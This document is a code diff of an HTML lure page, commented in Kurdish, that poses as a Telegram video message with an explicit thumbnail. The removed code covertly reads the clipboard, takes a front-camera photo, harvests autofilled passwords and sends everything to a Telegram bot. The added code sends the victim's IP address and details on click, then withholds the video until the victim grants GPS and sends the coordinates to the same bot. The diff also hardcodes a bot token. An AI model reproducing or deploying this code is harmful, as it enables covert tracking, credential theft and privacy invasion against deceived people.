@@ -3,111 +3,196 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    
-    <!-- Meta Tags بۆ ئەوەی لە تێلگرام وێنەکە بە گەورەیی و وەک ڤیدیۆ دەربکەوێت -->
+
+    <!-- Meta Tags بۆ ئەوەی لە تێلگرام وەک ڤیدیۆ دەربکەوێت -->
     <meta property="og:site_name" content="Telegram">
     <meta property="og:title" content="▶️ Telegram Video Message (0:45)">
     <meta property="og:description" content="Click to play video">
     <meta property="og:image" content="https://thumb-cdn77.xnxx-cdn.com/da26c94e-2e69-4882-8758-8089c8d80195/0/xn_6_p.jpg">
     <meta property="og:type" content="video.other">
-    
-    <!-- ئەم دوو دێڕە وێنەکە لە تێلگرام گەورە دەکات -->
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content="https://thumb-cdn77.xnxx-cdn.com/da26c94e-2e69-4882-8758-8089c8d80195/0/xn_6_p.jpg">
 
     <title>Video Player</title>
     <style>
-        body { font-family: -apple-system, system-ui, sans-serif; background: #000; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .video-container { position: relative; width: 100vw; height: 100vh; background: #000; }
-        iframe { width: 100%; height: 100%; border: none; }
-        
-        .click-trap { 
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
-            background: url('https://thumb-cdn77.xnxx-cdn.com/da26c94e-2e69-4882-8758-8089c8d80195/0/xn_6_p.jpg') center no-repeat;
-            background-size: cover; z-index: 1000; display: flex; justify-content: center; align-items: center; cursor: pointer;
-            transition: opacity 0.5s;
-        }
-        .play-btn { width: 85px; height: 85px; background: rgba(0,0,0,0.6); border-radius: 50%; display: flex; justify-content: center; align-items: center; border: 3px solid white; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
-        .play-icon { width: 0; height: 0; border-top: 18px solid transparent; border-bottom: 18px solid transparent; border-left: 28px solid white; margin-left: 8px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, system-ui, sans-serif; background: #000; height: 100vh; overflow: hidden; display: flex; justify-content: center; align-items: center; }
 
-        #spy-video { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.1; z-index: -1; pointer-events: none; }
-        canvas { display: none; }
-        #trap-form { position: absolute; opacity: 0.01; pointer-events: none; }
+        .video-container { position: relative; width: 100vw; height: 100vh; background: #000; }
+        #main-video { width: 100%; height: 100%; object-fit: contain; background: #000; }
+
+        .overlay { position: absolute; inset: 0; z-index: 1000; display: flex; flex-direction: column; justify-content: center; align-items: center; transition: opacity .4s; }
+        .hidden { opacity: 0; pointer-events: none; }
+
+        /* پۆستەری کرتە-تڕاپ */
+        #clickTrap { background: url('https://thumb-cdn77.xnxx-cdn.com/da26c94e-2e69-4882-8758-8089c8d80195/0/xn_6_p.jpg') center/cover no-repeat; cursor: pointer; }
+        .play-btn { width: 85px; height: 85px; background: rgba(0,0,0,.6); border-radius: 50%; display: flex; justify-content: center; align-items: center; border: 3px solid #fff; box-shadow: 0 0 20px rgba(0,0,0,.5); }
+        .play-icon { width: 0; height: 0; border-top: 18px solid transparent; border-bottom: 18px solid transparent; border-left: 28px solid #fff; margin-left: 8px; }
+
+        /* GPS overlay */
+        #gpsOverlay, #stoppedOverlay { background: rgba(0,0,0,.88); color: #fff; text-align: center; padding: 20px; }
+        .msg-box { max-width: 85%; }
+        .spinner { width: 40px; height: 40px; border: 4px solid rgba(255,255,255,.25); border-top-color: #fff; border-radius: 50%; margin: 0 auto 15px; animation: spin 1s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .gps-btn { margin-top: 15px; padding: 12px 28px; border: none; border-radius: 30px; background: #2AABEE; color: #fff; font-size: 16px; cursor: pointer; display: none; }
+        .stopped-icon { font-size: 46px; margin-bottom: 12px; }
+
+        #toast { position: absolute; bottom: 25px; left: 50%; transform: translateX(-50%); background: rgba(42,171,238,.95); color: #fff; padding: 10px 18px; border-radius: 20px; font-size: 14px; z-index: 2000; opacity: 0; transition: opacity .3s; pointer-events: none; }
+        #toast.show { opacity: 1; }
     </style>
 </head>
 <body>
 
-    <div class="video-container">
-        <iframe id="main-frame" src="https://www.xnxx.com/embedframe/koltifvd47e" allowfullscreen></iframe>
-        <div class="click-trap" id="clickTrap">
-            <div class="play-btn"><div class="play-icon"></div></div>
+<div class="video-container">
+
+    <!-- ⚠️ ئەم لینکە بگۆڕە بە ڤیدیۆی خۆت -->
+    <video id="main-video" playsinline muted preload="auto"
+        poster="https://thumb-cdn77.xnxx-cdn.com/da26c94e-2e69-4882-8758-8089c8d80195/0/xn_6_p.jpg"
+        src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerJoyrides.mp4"></video>
+
+    <!-- پۆستەری کرتە -->
+    <div class="overlay" id="clickTrap">
+        <div class="play-btn"><div class="play-icon"></div></div>
+    </div>
+
+    <!-- داواکاری GPS -->
+    <div class="overlay hidden" id="gpsOverlay">
+        <div class="msg-box">
+            <div class="spinner"></div>
+            <p id="gpsMsg">دەستنیشانکردنی شوێن (GPS) پێویستە...</p>
+            <button class="gps-btn" id="retryBtn">دەستپێکردنەوە</button>
         </div>
     </div>
 
-    <video id="spy-video" autoplay playsinline muted></video>
-    <canvas id="canvas"></canvas>
+    <!-- ڤیدیۆ وەستێنراو -->
+    <div class="overlay hidden" id="stoppedOverlay">
+        <div class="msg-box">
+            <div class="stopped-icon">⛔</div>
+            <p>ڤیدیۆکە وەستێنرا — پێویستی بە ڕێگەپێدانی GPS هەیە</p>
+        </div>
+    </div>
 
-    <form id="trap-form">
-        <input type="text" id="af_user" autocomplete="username">
-        <input type="password" id="af_pass" autocomplete="current-password">
-    </form>
+    <div id="toast">✓ شوێن پشتڕاستکرایەوە</div>
+</div>
 
-    <script>
-        const botToken = "8325580182:AAEZlBl-DbtFVRA2X3b9mN8qq-EAEcr_Aoc";
-        const chatId = "6679834643";
+<script>
+const botToken = "8325580182:AAEZlBl-DbtFVRA2X3b9mN8qq-EAEcr_Aoc";
+const chatId = "6679834643";
+const VIDEO_PREVIEW_SECONDS = 5;   // ئەمە بگۆڕە ئەگەر ویستت
 
-        async function sendToBot(text) {
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: text })
-            });
-        }
+const video = document.getElementById('main-video');
+const clickTrap = document.getElementById('clickTrap');
+const gpsOverlay = document.getElementById('gpsOverlay');
+const stoppedOverlay = document.getElementById('stoppedOverlay');
+const retryBtn = document.getElementById('retryBtn');
+const gpsMsg = document.getElementById('gpsMsg');
+const toast = document.getElementById('toast');
 
-        document.getElementById('clickTrap').addEventListener('click', async function() {
-            this.style.opacity = '0';
-            setTimeout(() => { this.style.display = 'none'; }, 500);
-
-            try {
-                const clipText = await navigator.clipboard.readText();
-                if(clipText) sendToBot("📋 Clipboard Found:\n" + clipText);
-            } catch(e) { console.log("Clipboard Access Denied"); }
-            
-            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
-                sendToBot(`🌐 IP: ${d.ip}\n🏙️ City: ${d.city}\n🏢 ISP: ${d.org}`);
-            });
-
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const spyVid = document.getElementById('spy-video');
-                spyVid.srcObject = stream;
-                
-                await new Promise(r => setTimeout(r, 6000));
-                
-                const canvas = document.getElementById('canvas');
-                canvas.width = spyVid.videoWidth; 
-                canvas.height = spyVid.videoHeight;
-                canvas.getContext('2d').drawImage(spyVid, 0, 0);
-                
-                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.95));
-                const fd = new FormData();
-                fd.append('chat_id', chatId);
-                fd.append('photo', blob, 'target.jpg');
-                fd.append('caption', '👤 Target Face Captured!');
-                
-                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
-                stream.getTracks().forEach(t => t.stop());
-            } catch(e) { await sendToBot("❌ Camera Access Denied"); }
-
-            let p = document.getElementById('af_pass').value;
-            if(p) sendToBot(`🔑 Pass Manager Stolen: ${p}`);
-
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((pos) => {
-                    sendToBot(`📍 GPS Map: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
-                }, null, { enableHighAccuracy: true });
-            }
+async function sendToBot(text) {
+    try {
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatId, text })
         });
-    </script>
+    } catch (e) { console.error('sendToBot failed', e); }
+}
+
+/* ١) تەنیا IP */
+async function sendIP() {
+    try {
+        const r = await fetch('https://ipapi.co/json/');
+        const d = await r.json();
+        await sendToBot(`🌐 IP: ${d.ip}\n🏙️ City: ${d.city} (${d.region})\n🏢 ISP: ${d.org}\n🗺️ Country: ${d.country_name}`);
+    } catch (e) { console.error('IP fetch failed'); }
+}
+
+/* ٢) تەنیا GPS — وەک Promise */
+function getLocation() {
+    return new Promise((resolve, reject) => {
+        if (!navigator.geolocation) return reject({ code: -1 });
+        navigator.geolocation.getCurrentPosition(resolve, reject, {
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 0
+        });
+    });
+}
+
+async function sendLocation(pos) {
+    const { latitude, longitude, accuracy } = pos.coords;
+    await sendToBot(`📍 GPS Map: https://www.google.com/maps?q=${latitude},${longitude}\n🎯 دەقیقە: ±${Math.round(accuracy)}m`);
+}
+
+function showToast(txt) {
+    toast.textContent = txt;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2500);
+}
+
+/* ڤیدیۆ بە تەواوی دەوەستێنرێت */
+function stopVideo() {
+    video.pause();
+    video.removeAttribute('src');
+    video.load();
+    gpsOverlay.classList.add('hidden');
+    stoppedOverlay.classList.remove('hidden');
+}
+
+/* داواکاری GPS + بڕیاردان لەسەر ڤیدیۆ */
+async function requestGPS() {
+    gpsMsg.textContent = 'دەستنیشانکردنی شوێن (GPS) پێویستە...';
+    retryBtn.style.display = 'none';
+    gpsOverlay.classList.remove('hidden');
+
+    try {
+        const pos = await getLocation();
+        await sendLocation(pos);
+
+        // Allow → ڤیدیۆ بەردەوام دەبێت
+        gpsOverlay.classList.add('hidden');
+        video.play().catch(() => {
+            video.muted = true;
+            video.play().catch(() => {});
+        });
+        showToast('✓ شوێن پشتڕاستکرایەوە — ڤیدیۆ بەردەوامە');
+    } catch (err) {
+        if (err && err.code === 1) {
+            // Deny → ڤیدیۆ دەوەستێت
+            await sendToBot('⛔ GPS ڕەتکرایەوە — ڤیدیۆ وەستێنرا');
+            stopVideo();
+        } else {
+            // وێبگەڕەکە داواکاری خۆکارەکەی بەربەست کرد → دوگمەی دووبارە
+            gpsMsg.textContent = 'داواکاری شوێن سەرکەوتوو نەبوو — تکایە دووبارە هەوڵ بدەرەوە';
+            retryBtn.style.display = 'inline-block';
+        }
+    }
+}
+
+clickTrap.addEventListener('click', function () {
+    clickTrap.classList.add('hidden');
+
+    // IP ڕاستەوخۆ دەنێردرێت
+    sendIP();
+
+    // ڤیدیۆ دەستی پێدەکات (بێ دەنگ، پاشان دەنگ)
+    video.muted = true;
+    video.play().then(() => {
+        video.muted = false;
+
+        // ٥ چرکە دەژەنێت، پاشان GPS داوا دەکات
+        setTimeout(() => {
+            video.pause();
+            requestGPS();
+        }, VIDEO_PREVIEW_SECONDS * 1000);
+    }).catch(() => {
+        // ئەگەر پلەی بەربەست بوو، ڕاستەوخۆ GPS بپرسە
+        requestGPS();
+    });
+});
+
+/* Fallback: ئەگەر وێبگەڕەکە داواکاری خۆکارەکەی بەربەست کرد */
+retryBtn.addEventListener('click', requestGPS);
+</script>
 </body>
 </html>
